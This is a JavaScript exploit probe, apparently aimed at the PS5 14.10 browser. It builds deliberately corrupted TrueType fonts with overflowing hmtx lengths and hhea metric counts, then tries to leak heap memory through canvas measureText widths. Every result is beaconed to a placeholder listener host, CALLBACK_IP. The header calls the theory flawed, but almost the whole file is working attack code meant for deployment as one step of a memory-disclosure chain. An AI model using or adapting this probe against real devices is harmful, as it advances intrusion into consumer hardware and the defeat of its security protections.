// p252 — FreeType measureText Info Leak Probe
// PS5 14.10 — CVE-2026-43720 companion: leak heap data via corrupted TrueType hmtx
//
// STATUS: THEORY FLAWED — deploy as a test, not a known-good primitive.
//
// Known issue (NeonStride, Oct 23): FreeType's FT_Stream_ReadAt bounds-checks
// stream reads against file size (= ArrayBuffer byteLength). Even with buffer
// truncation (font ends before declared hmtx extent), FreeType likely rejects
// the font (LOAD-ERR) rather than reading OOB. JS ArrayBuffer is also
// zero-initialized, so any in-buffer overflow reads zeros, not heap data.
//
// This probe is still worth deploying as a TEST: if PS5's FreeType build has
// a bounds-check bug or processes hmtx differently, T2/T4 widths diverging
// from T1 baseline = confirmed leak. Expected result: LOAD-ERR on T2/T4.
// Deploy AFTER v600 results are in (v600 = primary info leak path).
//
// Theory: FontFace API loads fonts from ArrayBuffer (confirmed p161a T13).
// FreeType parses hmtx to get glyph advance widths. If hmtx table directory
// entry claims a larger length than actual data, FreeType reads OOB into
// adjacent heap memory. measureText() returns widths derived from that OOB
// data as JS numbers.
//
// Four test phases:
//   T1: Baseline valid font — sanity check measureText works
//   T2: hmtx table length overflow — directory says 1024B, actual data 64B
//        (font truncated: hmtx declared extent past EOF)
//   T3: hhea numberOfHMetrics overflow — hhea says 256, only 16 entries exist
//   T4: Combined — both hmtx length and hhea overflow
//
// Replace CALLBACK_IP with your listener address.

(function() {
  'use strict';

  var CALLBACK = 'http://CALLBACK_IP:8080';
  var NUM_REAL_GLYPHS = 16;
  var NUM_DECLARED_GLYPHS = 256;

  function beacon(tag, msg) {
    try {
      new Image().src = CALLBACK + '/p252?t=' + encodeURIComponent(tag) +
        '&m=' + encodeURIComponent(msg) + '&_=' + Date.now();
    } catch(e) {}
  }

  function beaconLeak(test, glyphId, width, rawWidth) {
    try {
      new Image().src = CALLBACK + '/p252-leak?test=' + test +
        '&g=' + glyphId + '&w=' + width + '&raw=' + rawWidth + '&_=' + Date.now();
    } catch(e) {}
  }

  // --- TrueType binary construction utilities ---

  function tag(str) {
    return (str.charCodeAt(0) << 24) | (str.charCodeAt(1) << 16) |
           (str.charCodeAt(2) << 8) | str.charCodeAt(3);
  }

  function pad4(n) {
    return (n + 3) & ~3;
  }

  function calcChecksum(buf, offset, length) {
    var sum = 0;
    var nLongs = Math.ceil(length / 4);
    var view = new DataView(buf);
    for (var i = 0; i < nLongs; i++) {
      var pos = offset + i * 4;
      if (pos + 4 <= buf.byteLength) {
        sum = (sum + view.getUint32(pos)) >>> 0;
      } else {
        var val = 0;
        for (var b = 0; b < 4; b++) {
          val <<= 8;
          if (pos + b < buf.byteLength && pos + b < offset + length) {
            val |= view.getUint8(pos + b);
          }
        }
        sum = (sum + (val >>> 0)) >>> 0;
      }
    }
    return sum;
  }

  // --- Table builders ---

  function buildHead() {
    // 54 bytes
    var buf = new ArrayBuffer(56); // pad to 4-byte alignment
    var v = new DataView(buf);
    v.setUint32(0, 0x00010000);   // version 1.0
    v.setUint32(4, 0x00005000);   // fontRevision
    v.setUint32(8, 0x00000000);   // checksumAdjustment (filled later)
    v.setUint32(12, 0x5F0F3CF5);  // magicNumber
    v.setUint16(16, 0x000B);      // flags: baseline at y=0, lsb at x=0, hints, etc.
    v.setUint16(18, 2048);        // unitsPerEm
    // created/modified timestamps (8 bytes each) — leave as zero
    v.setInt16(36, 0);            // xMin
    v.setInt16(38, 0);            // yMin
    v.setInt16(40, 2048);         // xMax
    v.setInt16(42, 2048);         // yMax
    v.setUint16(44, 0);           // macStyle
    v.setUint16(46, 8);           // lowestRecPPEM
    v.setInt16(48, 2);            // fontDirectionHint
    v.setInt16(50, 0);            // indexToLocFormat: 0 = short
    v.setInt16(52, 0);            // glyphDataFormat
    return { tag: 'head', buf: buf, realLen: 54 };
  }

  function buildHhea(numberOfHMetrics) {
    var buf = new ArrayBuffer(36);
    var v = new DataView(buf);
    v.setUint32(0, 0x00010000);    // version
    v.setInt16(4, 1800);           // ascender
    v.setInt16(6, -200);           // descender
    v.setInt16(8, 0);              // lineGap
    v.setUint16(10, 2048);         // advanceWidthMax
    v.setInt16(12, 0);             // minLeftSideBearing
    v.setInt16(14, 0);             // minRightSideBearing
    v.setInt16(16, 2048);          // xMaxExtent
    v.setInt16(18, 1);             // caretSlopeRise
    v.setInt16(20, 0);             // caretSlopeRun
    v.setInt16(22, 0);             // caretOffset
    // 4 reserved int16 = 0 (bytes 24-31)
    v.setInt16(32, 0);             // metricDataFormat
    v.setUint16(34, numberOfHMetrics);
    return { tag: 'hhea', buf: buf, realLen: 36 };
  }

  function buildMaxp(numGlyphs) {
    var buf = new ArrayBuffer(32);
    var v = new DataView(buf);
    v.setUint32(0, 0x00010000);    // version 1.0
    v.setUint16(4, numGlyphs);
    v.setUint16(6, 64);            // maxPoints
    v.setUint16(8, 1);             // maxContours
    v.setUint16(10, 0);            // maxCompositePoints
    v.setUint16(12, 0);            // maxCompositeContours
    v.setUint16(14, 1);            // maxZones
    v.setUint16(16, 0);            // maxTwilightPoints
    v.setUint16(18, 0);            // maxStorage
    v.setUint16(20, 0);            // maxFunctionDefs
    v.setUint16(22, 0);            // maxInstructionDefs
    v.setUint16(24, 0);            // maxStackElements
    v.setUint16(26, 0);            // maxSizeOfInstructions
    v.setUint16(28, 0);            // maxComponentElements
    v.setUint16(30, 0);            // maxComponentDepth
    return { tag: 'maxp', buf: buf, realLen: 32 };
  }

  function buildHmtx(numReal, declaredLen) {
    // Write only numReal entries (each 4 bytes: uint16 advanceWidth + int16 lsb)
    // but the table directory will claim declaredLen bytes
    var realBytes = numReal * 4;
    var allocBytes = pad4(Math.max(realBytes, declaredLen));
    var buf = new ArrayBuffer(allocBytes);
    var v = new DataView(buf);
    for (var i = 0; i < numReal; i++) {
      v.setUint16(i * 4, 600);     // advanceWidth = 600 (baseline reference)
      v.setInt16(i * 4 + 2, 0);    // lsb = 0
    }
    // Bytes beyond realBytes are uninitialized (zeros in JS ArrayBuffer).
    // When this is loaded by FontFace, the font buffer lives in FastMalloc.
    // Bytes beyond realBytes in the FONT'S OWN BUFFER are zeros.
    // BUT: if FreeType reads past the font buffer's allocation entirely
    // (because declaredLen in the table directory extends past the font file),
    // it reads from adjacent heap memory — which may contain pointers.
    return { tag: 'hmtx', buf: buf, realLen: realBytes, declaredLen: declaredLen };
  }

  function buildCmap(numGlyphs) {
    // Format 0: byte encoding, maps char codes 0-255 to glyph IDs 0-255
    var headerSize = 4;         // version(2) + numTables(2)
    var recordSize = 8;         // platformID(2) + encodingID(2) + offset(4)
    var subtableSize = 6 + 256; // format(2) + length(2) + language(2) + 256 bytes
    var totalSize = pad4(headerSize + recordSize + subtableSize);
    var buf = new ArrayBuffer(totalSize);
    var v = new DataView(buf);
    v.setUint16(0, 0);           // version
    v.setUint16(2, 1);           // numTables
    // Encoding record
    v.setUint16(4, 1);           // platformID = Macintosh
    v.setUint16(6, 0);           // encodingID = Roman
    v.setUint32(8, 12);          // offset to subtable
    // Format 0 subtable
    v.setUint16(12, 0);          // format = 0
    v.setUint16(14, 6 + 256);    // length
    v.setUint16(16, 0);          // language
    for (var i = 0; i < 256; i++) {
      v.setUint8(18 + i, i < numGlyphs ? i : 0);
    }
    return { tag: 'cmap', buf: buf, realLen: headerSize + recordSize + subtableSize };
  }

  function buildName() {
    // Minimal name table: font family + subfamily
    var nameStr = 'LeakProbe';
    var subStr = 'Regular';
    var headerSize = 6;          // format(2) + count(2) + stringOffset(2)
    var numRecords = 4;          // nameID 1 (family), 2 (subfamily), 4 (full), 6 (postscript)
    var recordsSize = numRecords * 12;
    var stringsOffset = headerSize + recordsSize;
    var nameBytes = [];
    for (var i = 0; i < nameStr.length; i++) nameBytes.push(0, nameStr.charCodeAt(i));
    for (var i = 0; i < subStr.length; i++) nameBytes.push(0, subStr.charCodeAt(i));
    var nameLen = nameStr.length * 2;
    var subLen = subStr.length * 2;
    var totalSize = pad4(stringsOffset + nameLen + subLen);
    var buf = new ArrayBuffer(totalSize);
    var v = new DataView(buf);
    v.setUint16(0, 0);           // format
    v.setUint16(2, numRecords);
    v.setUint16(4, stringsOffset);
    // Records: platformID=3 (Windows), encodingID=1 (Unicode BMP), languageID=0x0409
    var ids = [1, 2, 4, 6];
    for (var r = 0; r < numRecords; r++) {
      var off = headerSize + r * 12;
      v.setUint16(off, 3);       // platformID
      v.setUint16(off+2, 1);     // encodingID
      v.setUint16(off+4, 0x0409);// languageID
      v.setUint16(off+6, ids[r]);// nameID
      if (ids[r] === 2) {
        v.setUint16(off+8, subLen);
        v.setUint16(off+10, nameLen);
      } else {
        v.setUint16(off+8, nameLen);
        v.setUint16(off+10, 0);
      }
    }
    for (var i = 0; i < nameBytes.length; i++) {
      v.setUint8(stringsOffset + i, nameBytes[i]);
    }
    return { tag: 'name', buf: buf, realLen: stringsOffset + nameLen + subLen };
  }

  function buildPost() {
    // Format 3.0 — no glyph names
    var buf = new ArrayBuffer(32);
    var v = new DataView(buf);
    v.setUint32(0, 0x00030000);  // format 3.0
    v.setUint32(4, 0x00000000);  // italicAngle
    v.setInt16(8, -100);         // underlinePosition
    v.setInt16(10, 50);          // underlineThickness
    v.setUint32(12, 0);          // isFixedPitch
    // minMemType42, maxMemType42, minMemType1, maxMemType1 — all zero
    return { tag: 'post', buf: buf, realLen: 32 };
  }

  function buildGlyf(numGlyphs) {
    // Each glyph: empty contour (10 bytes header + 2 byte endPtsOfContours +
    // 2 byte instructionLength + 1 byte flag + 0 coords = 15 bytes, pad to 16)
    // For simplicity: glyph 0 = .notdef with a simple box, rest = empty (0 contours = -1)
    // Actually simplest: ALL glyphs have numberOfContours = 0 (composite marker)
    // Even simpler: use numberOfContours = -1 (empty/blank glyph, 10 bytes each)
    // Simplest valid: just the header with numberOfContours=0 and bounding box = 0
    var glyphSize = 12; // pad 10-byte header to 12 for alignment
    var totalSize = pad4(numGlyphs * glyphSize);
    var buf = new ArrayBuffer(totalSize);
    var v = new DataView(buf);
    for (var i = 0; i < numGlyphs; i++) {
      var off = i * glyphSize;
      v.setInt16(off, 0);       // numberOfContours (0 = no contours, blank)
      v.setInt16(off+2, 0);     // xMin
      v.setInt16(off+4, 0);     // yMin
      v.setInt16(off+6, 600);   // xMax
      v.setInt16(off+8, 800);   // yMax
      // 2 bytes padding
    }
    return { tag: 'glyf', buf: buf, realLen: numGlyphs * glyphSize };
  }

  function buildLoca(numGlyphs, glyphSize) {
    // Short format: (numGlyphs+1) uint16 values, each = offset/2
    var numEntries = numGlyphs + 1;
    var totalSize = pad4(numEntries * 2);
    var buf = new ArrayBuffer(totalSize);
    var v = new DataView(buf);
    for (var i = 0; i <= numGlyphs; i++) {
      v.setUint16(i * 2, (i * glyphSize) / 2); // offset/2 for short format
    }
    return { tag: 'loca', buf: buf, realLen: numEntries * 2 };
  }

  // --- Font assembler ---

  function assembleFont(tables, hmtxDeclaredLen) {
    // tables: array of { tag, buf, realLen, declaredLen? }
    var numTables = tables.length;
    // searchRange, entrySelector, rangeShift
    var entrySelector = Math.floor(Math.log(numTables) / Math.LN2);
    var searchRange = Math.pow(2, entrySelector) * 16;
    var rangeShift = numTables * 16 - searchRange;

    var headerSize = 12;
    var dirSize = numTables * 16;
    var dataOffset = headerSize + dirSize;

    // Compute table offsets
    var offset = dataOffset;
    var tableEntries = [];
    for (var i = 0; i < tables.length; i++) {
      var t = tables[i];
      var declLen = t.declaredLen || t.realLen;
      tableEntries.push({
        tag: t.tag,
        offset: offset,
        realLen: t.realLen,
        declaredLen: declLen,
        buf: t.buf
      });
      // Allocate space for realLen only — NOT declaredLen.
      // If declaredLen > realLen (the corruption), the table directory says
      // the table is bigger than the font buffer. FreeType reads past the
      // buffer into adjacent FastMalloc heap memory (stale data, no zeroing
      // on libpas/PS5). This only matters for the LAST table (hmtx in T2/T4).
      offset += pad4(t.realLen);
    }

    var totalSize = offset;
    var fontBuf = new ArrayBuffer(totalSize);
    var fv = new DataView(fontBuf);

    // Offset table header
    fv.setUint32(0, 0x00010000);   // sfVersion
    fv.setUint16(4, numTables);
    fv.setUint16(6, searchRange);
    fv.setUint16(8, entrySelector);
    fv.setUint16(10, rangeShift);

    // Copy table data first (need for checksums)
    for (var i = 0; i < tableEntries.length; i++) {
      var te = tableEntries[i];
      var src = new Uint8Array(te.buf);
      var dst = new Uint8Array(fontBuf);
      // Copy only realLen bytes (the rest stays as zeros in the font buffer)
      for (var b = 0; b < te.realLen && b < src.length; b++) {
        dst[te.offset + b] = src[b];
      }
    }

    // Write table directory
    // Sort by tag for proper TrueType ordering
    var sorted = tableEntries.slice().sort(function(a, b) {
      return tag(a.tag) - tag(b.tag);
    });

    for (var i = 0; i < sorted.length; i++) {
      var te = sorted[i];
      var dirOff = headerSize + i * 16;
      fv.setUint32(dirOff, tag(te.tag));
      fv.setUint32(dirOff + 4, calcChecksum(fontBuf, te.offset, te.realLen));
      fv.setUint32(dirOff + 8, te.offset);
      fv.setUint32(dirOff + 12, te.declaredLen);
    }

    // Fix head checksumAdjustment
    var headEntry = null;
    for (var i = 0; i < sorted.length; i++) {
      if (sorted[i].tag === 'head') { headEntry = sorted[i]; break; }
    }
    if (headEntry) {
      // First zero out the checksumAdjustment field
      fv.setUint32(headEntry.offset + 8, 0);
      // Calculate whole-font checksum
      var wholeChecksum = calcChecksum(fontBuf, 0, totalSize);
      var adjustment = (0xB1B0AFBA - wholeChecksum) >>> 0;
      fv.setUint32(headEntry.offset + 8, adjustment);
    }

    return fontBuf;
  }

  // --- Probe runner ---

  function runTest(testName, fontBuf, glyphStart, glyphEnd) {
    return new Promise(function(resolve) {
      beacon(testName, 'FONT-BUILT|size=' + fontBuf.byteLength);

      var face;
      try {
        face = new FontFace(testName, fontBuf);
      } catch(e) {
        beacon(testName, 'FONTFACE-ERR|' + e.message);
        resolve(null);
        return;
      }
      beacon(testName, 'FONTFACE-OK');

      face.load().then(function() {
        beacon(testName, 'LOADED-OK');
        try {
          document.fonts.add(face);
        } catch(e) {
          beacon(testName, 'ADD-ERR|' + e.message);
          resolve(null);
          return;
        }
        beacon(testName, 'ADDED-OK');

        var canvas = document.createElement('canvas');
        canvas.width = 400;
        canvas.height = 100;
        var ctx = canvas.getContext('2d');
        ctx.font = '48px ' + testName;

        var results = [];
        for (var g = glyphStart; g < glyphEnd; g++) {
          try {
            var ch = String.fromCharCode(g);
            var metrics = ctx.measureText(ch);
            var w = metrics.width;
            // Also try actualBoundingBoxRight for additional data
            var abr = metrics.actualBoundingBoxRight || 0;
            results.push({ g: g, w: w, abr: abr });
            beaconLeak(testName, g, w, abr);
          } catch(e) {
            beacon(testName, 'MEASURE-ERR|g=' + g + '|' + e.message);
          }
        }

        beacon(testName, 'DONE|count=' + results.length);

        // Remove font to avoid polluting other tests
        try { document.fonts.delete(face); } catch(e) {}

        resolve(results);
      }).catch(function(e) {
        beacon(testName, 'LOAD-ERR|' + e.message);
        resolve(null);
      });
    });
  }

  // --- Main ---

  beacon('p252', 'BOOT');

  // Build the common tables
  var glyphSize = 12;

  // =========================================================
  // T1: BASELINE — valid font, all tables consistent
  // =========================================================
  var t1Head = buildHead();
  var t1Hhea = buildHhea(NUM_DECLARED_GLYPHS); // numberOfHMetrics matches numGlyphs
  var t1Maxp = buildMaxp(NUM_DECLARED_GLYPHS);
  var t1Hmtx = buildHmtx(NUM_DECLARED_GLYPHS, NUM_DECLARED_GLYPHS * 4); // all entries present
  var t1Cmap = buildCmap(NUM_DECLARED_GLYPHS);
  var t1Name = buildName();
  var t1Post = buildPost();
  var t1Glyf = buildGlyf(NUM_DECLARED_GLYPHS);
  var t1Loca = buildLoca(NUM_DECLARED_GLYPHS, glyphSize);

  var t1Font = assembleFont(
    [t1Head, t1Hhea, t1Maxp, t1Hmtx, t1Cmap, t1Name, t1Post, t1Glyf, t1Loca],
    null
  );

  // =========================================================
  // T2: HMTX LENGTH OVERFLOW
  // hmtx has 16 real entries (64 bytes) but directory says 1024 bytes.
  // maxp says 256 glyphs. hhea says 16 numberOfHMetrics.
  // Glyphs 16-255: FreeType should use the LAST hmtx entry's advanceWidth
  // (per TrueType spec: for glyphs >= numberOfHMetrics, advance = last full
  // entry, lsb = array after full entries). BUT with the table length
  // extended, the FONT FILE contains zeros in bytes 64-1023 (within the AB).
  // The leak happens if FreeType reads PAST the font buffer allocation
  // into adjacent heap. To force this: make the font buffer end right
  // at the hmtx data, with declaredLen extending past the allocation.
  //
  // Strategy: place hmtx as the LAST table in the font. Declared length
  // extends past the end of the ArrayBuffer. FreeType trusts the table
  // directory length and reads past the buffer into heap.
  // =========================================================
  var t2Head = buildHead();
  var t2Hhea = buildHhea(NUM_REAL_GLYPHS);     // 16 metrics
  var t2Maxp = buildMaxp(NUM_DECLARED_GLYPHS);  // 256 glyphs
  var t2Hmtx = buildHmtx(NUM_REAL_GLYPHS, NUM_DECLARED_GLYPHS * 4); // 64B real, 1024B declared
  var t2Cmap = buildCmap(NUM_DECLARED_GLYPHS);
  var t2Name = buildName();
  var t2Post = buildPost();
  var t2Glyf = buildGlyf(NUM_REAL_GLYPHS);     // only 16 glyphs in glyf
  var t2Loca = buildLoca(NUM_REAL_GLYPHS, glyphSize);

  // Place hmtx LAST so its declared extension goes past EOF
  var t2Font = assembleFont(
    [t2Head, t2Hhea, t2Maxp, t2Cmap, t2Name, t2Post, t2Glyf, t2Loca, t2Hmtx],
    null
  );

  // =========================================================
  // T3: HHEA numberOfHMetrics OVERFLOW
  // hhea says 256 full metric entries, but hmtx only has 16 entries (64B).
  // Table directory length for hmtx = 64 (honest). FreeType reads 256
  // entries × 4 bytes = 1024 bytes from a 64-byte table, going OOB within
  // the font buffer into whatever tables follow hmtx.
  // =========================================================
  var t3Head = buildHead();
  var t3Hhea = buildHhea(NUM_DECLARED_GLYPHS);  // LIE: 256 metrics
  var t3Maxp = buildMaxp(NUM_DECLARED_GLYPHS);
  var t3Hmtx = buildHmtx(NUM_REAL_GLYPHS, NUM_REAL_GLYPHS * 4); // honest 64B length
  var t3Cmap = buildCmap(NUM_DECLARED_GLYPHS);
  var t3Name = buildName();
  var t3Post = buildPost();
  var t3Glyf = buildGlyf(NUM_REAL_GLYPHS);
  var t3Loca = buildLoca(NUM_REAL_GLYPHS, glyphSize);

  // Place hmtx FIRST in data so its "overflow" reads into other tables' data
  var t3Font = assembleFont(
    [t3Hmtx, t3Head, t3Hhea, t3Maxp, t3Cmap, t3Name, t3Post, t3Glyf, t3Loca],
    null
  );

  // =========================================================
  // T4: COMBINED — both hmtx length and hhea overflow
  // Covers the case where FreeType checks one but not the other
  // =========================================================
  var t4Head = buildHead();
  var t4Hhea = buildHhea(NUM_DECLARED_GLYPHS);  // LIE: 256 metrics
  var t4Maxp = buildMaxp(NUM_DECLARED_GLYPHS);
  var t4Hmtx = buildHmtx(NUM_REAL_GLYPHS, NUM_DECLARED_GLYPHS * 4); // 64B real, 1024B declared
  var t4Cmap = buildCmap(NUM_DECLARED_GLYPHS);
  var t4Name = buildName();
  var t4Post = buildPost();
  var t4Glyf = buildGlyf(NUM_REAL_GLYPHS);
  var t4Loca = buildLoca(NUM_REAL_GLYPHS, glyphSize);

  var t4Font = assembleFont(
    [t4Head, t4Hhea, t4Maxp, t4Cmap, t4Name, t4Post, t4Glyf, t4Loca, t4Hmtx],
    null
  );

  beacon('p252', 'FONTS-BUILT|t1=' + t1Font.byteLength + '|t2=' + t2Font.byteLength +
    '|t3=' + t3Font.byteLength + '|t4=' + t4Font.byteLength);

  // Run tests sequentially
  runTest('p252-T1', t1Font, 0, 32).then(function(baseline) {
    if (!baseline) {
      beacon('p252', 'T1-FAIL|baseline-dead');
      return;
    }
    beacon('p252', 'T1-PASS|samples=' + baseline.length);

    // Build baseline width map for comparison
    var baseWidths = {};
    for (var i = 0; i < baseline.length; i++) {
      baseWidths[baseline[i].g] = baseline[i].w;
    }

    return runTest('p252-T2', t2Font, 0, 48).then(function(t2Results) {
      if (!t2Results) {
        beacon('p252', 'T2-FAIL|load-rejected');
      } else {
        // Check for widths that differ from baseline (leak signal)
        var leaks = 0;
        for (var i = 0; i < t2Results.length; i++) {
          var r = t2Results[i];
          var baseW = baseWidths[r.g];
          if (r.g >= NUM_REAL_GLYPHS && r.w !== 0 && r.w !== baseW) {
            leaks++;
            beacon('p252', 'T2-LEAK-CANDIDATE|g=' + r.g + '|w=' + r.w +
              '|base=' + (baseW || 'none'));
          }
        }
        beacon('p252', 'T2-DONE|leaks=' + leaks);
      }

      return runTest('p252-T3', t3Font, 0, 48);
    }).then(function(t3Results) {
      if (!t3Results) {
        beacon('p252', 'T3-FAIL|load-rejected');
      } else {
        var leaks = 0;
        for (var i = 0; i < t3Results.length; i++) {
          var r = t3Results[i];
          var baseW = baseWidths[r.g];
          if (r.g >= NUM_REAL_GLYPHS && r.w !== 0 && r.w !== baseW) {
            leaks++;
            beacon('p252', 'T3-LEAK-CANDIDATE|g=' + r.g + '|w=' + r.w +
              '|base=' + (baseW || 'none'));
          }
        }
        beacon('p252', 'T3-DONE|leaks=' + leaks);
      }

      return runTest('p252-T4', t4Font, 0, 48);
    }).then(function(t4Results) {
      if (!t4Results) {
        beacon('p252', 'T4-FAIL|load-rejected');
      } else {
        var leaks = 0;
        for (var i = 0; i < t4Results.length; i++) {
          var r = t4Results[i];
          var baseW = baseWidths[r.g];
          if (r.g >= NUM_REAL_GLYPHS && r.w !== 0 && r.w !== baseW) {
            leaks++;
            beacon('p252', 'T4-LEAK-CANDIDATE|g=' + r.g + '|w=' + r.w +
              '|base=' + (baseW || 'none'));
          }
        }
        beacon('p252', 'T4-DONE|leaks=' + leaks);
      }

      beacon('p252', 'ALL-DONE');
    });
  }).catch(function(e) {
    beacon('p252', 'FATAL|' + e.message);
  });

})();
